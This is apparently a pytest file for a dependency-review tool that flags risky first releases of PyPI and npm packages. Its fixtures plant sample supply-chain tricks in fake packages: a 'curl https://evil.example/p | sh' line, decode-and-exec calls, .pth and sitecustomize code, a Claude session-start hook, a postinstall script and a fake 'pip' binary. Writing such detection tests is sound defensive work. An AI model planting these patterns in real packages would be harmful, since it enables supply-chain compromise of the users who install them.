from __future__ import annotations

import json

from tests.test_upgrade_review import _kinds, registry

from ca9 import api

__all__ = ["registry"]

OBFUSCATED = "".join(f"var _0x{index:04x} = {index};\n" for index in range(2000))


def _first(ecosystem, name, version, old=None, *, missing=False):
    pair = {"ecosystem": ecosystem, "name": name, "new": version}
    if not missing:
        pair["old"] = old
    report = api.review_upgrades([pair])
    return report["results"][0], report["receipt"]


def _pypi_payloads():
    return {
        "demo/__init__.py": (
            "import base64, os, subprocess, urllib.request\n"
            "urllib.request.urlopen('https://evil.example/c')\n"
            "subprocess.run(['id'])\n"
            "exec(base64.b64decode('cHJpbnQoMSk='))\n"
            "exec(open(os.path.join(os.path.dirname(__file__), '_data.txt')).read())\n"
        ),
        "demo/_data.txt": "import os\nos.system('curl -s https://evil.example/p | sh')\n",
        "demo/_core.so": b"\x7fELF\x02" + b"\x00" * 64,
        "demo/_obf.py": OBFUSCATED.replace("var ", ""),
        "demo/launcher/sitecustomize.py": "import os\nos.environ['X'] = '1'\n",
        "demo/.claude/settings.json": json.dumps(
            {"hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": "id"}]}]}}
        ),
        "demo.pth": "import os; os.system('id')\n",
        "demo-own.pth": "import demo_quiet\n",
        "demo_quiet.py": "X = 1\n",
        "sitecustomize.py": "import os\nos.environ['Y'] = '1'\n",
        "demo-1.0.dist-info/entry_points.txt": "[console_scripts]\npip = demo:main\n",
    }


def test_first_release_wheel_reports_every_risky_behaviour_at_upgrade_levels(registry):
    registry.pypi("demo", "1.0", wheel=_pypi_payloads())

    result, receipt = _first("pypi", "demo", "1.0")

    assert result["status"] == "reviewed"
    assert result["basis"] == "new_package"
    assert result["first_release"] is True
    assert receipt["first_release_reviews"] == 1
    assert set(_kinds(result, "block")) == {
        "new_decode_exec",
        "new_import_time_exec",
        "new_import_time_network",
        "new_pth_code",
        "new_sitecustomize",
        "obfuscation_growth",
        "ships_agent_or_editor_hook",
        "shadows_system_command",
    }
    paths = {(delta["kind"], delta["path"]) for delta in result["block"]}
    assert ("new_sitecustomize", "demo/launcher/sitecustomize.py") in paths
    assert ("new_sitecustomize", "sitecustomize.py") in paths
    assert ("new_pth_code", "demo-own.pth") in paths
    assert "new_native_binary" in _kinds(result, "warn")
    assert all(delta["kind"] != "new_native_binary" for delta in result["info"])


def test_first_release_npm_tarball_blocks_install_hooks_like_an_upgrade(registry):
    registry.npm(
        "fresh-tool",
        "1.0.0",
        {
            "index.js": (
                "const cp = require('child_process');\n"
                "const fs = require('fs');\n"
                "eval(fs.readFileSync(__dirname + '/data.bin', 'utf8'));\n"
                "module.exports = 1;\n"
            ),
            "data.bin": "require('child_process').execSync('id');\n",
            "install.js": "console.log('built');\n",
            "git": "#!/bin/sh\n",
            "big.js": OBFUSCATED,
        },
        manifest={"scripts": {"postinstall": "node install.js"}, "bin": {"git": "git"}},
    )

    result, receipt = _first("npm", "fresh-tool", "1.0.0")

    assert result["first_release"] is True
    assert receipt["first_release_reviews"] == 1
    assert {
        "new_install_hook",
        "new_decode_exec",
        "obfuscation_growth",
        "shadows_system_command",
    } <= set(_kinds(result, "block"))
    assert "new_import_time_exec" in _kinds(result, "warn")


def test_first_release_is_recognised_for_null_empty_and_missing_old(registry):
    registry.pypi(
        "demo",
        "1.0",
        wheel={"demo/__init__.py": "X = 1\n", "demo.pth": "import os; os.system('id')\n"},
    )
    pairs = [
        {"ecosystem": "pypi", "name": "demo", "old": None, "new": "1.0"},
        {"ecosystem": "pypi", "name": "demo", "old": "  ", "new": "1.0"},
        {"ecosystem": "pypi", "name": "demo", "new": "1.0"},
    ]

    report = api.review_upgrades(pairs)

    assert [item["status"] for item in report["results"]] == ["reviewed"] * 3
    assert all(item["first_release"] is True for item in report["results"])
    assert all(item["old"] is None for item in report["results"])
    assert all(_kinds(item, "block") == ["new_pth_code"] for item in report["results"])
    assert report["receipt"]["first_release_reviews"] == 3
    assert report["receipt"]["complete"] is True


def test_benign_first_releases_stay_quiet(registry):
    registry.pypi(
        "calm",
        "1.0",
        wheel={
            "calm/__init__.py": (
                "import json\nfrom pathlib import Path\n"
                "DATA = json.loads((Path(__file__).parent / 'data.json').read_text())\n"
            ),
            "calm/data.json": "{}",
            "calm/run.py": "import subprocess\n\ndef run(args):\n    return subprocess.run(args)\n",
            "calm-paths.pth": "calm_extra\n",
        },
    )
    registry.npm(
        "calm-js",
        "1.0.0",
        {
            "index.js": (
                "const fs = require('fs');\nconst path = require('path');\n"
                "module.exports = JSON.parse(fs.readFileSync(path.join(__dirname, 'data.json'), 'utf8'));\n"
            ),
            "data.json": "{}",
        },
        manifest={"scripts": {"test": "node test.js", "prepare": "tsc"}},
    )

    python, _ = _first("pypi", "calm", "1.0")
    javascript, _ = _first("npm", "calm-js", "1.0.0")

    for result in (python, javascript):
        assert result["first_release"] is True
        assert result["block"] == []
        assert result["warn"] == []


def test_upgrades_are_not_marked_as_first_releases(registry):
    registry.pypi("demo", "1.0", wheel={"demo/__init__.py": "X = 1\n"})
    registry.pypi("demo", "1.1", wheel={"demo/__init__.py": "X = 2\n"})

    report = api.review_upgrades(
        [{"ecosystem": "pypi", "name": "demo", "old": "1.0", "new": "1.1"}]
    )

    assert "first_release" not in report["results"][0]
    assert report["results"][0]["basis"] == "upgrade"
    assert report["receipt"]["first_release_reviews"] == 0
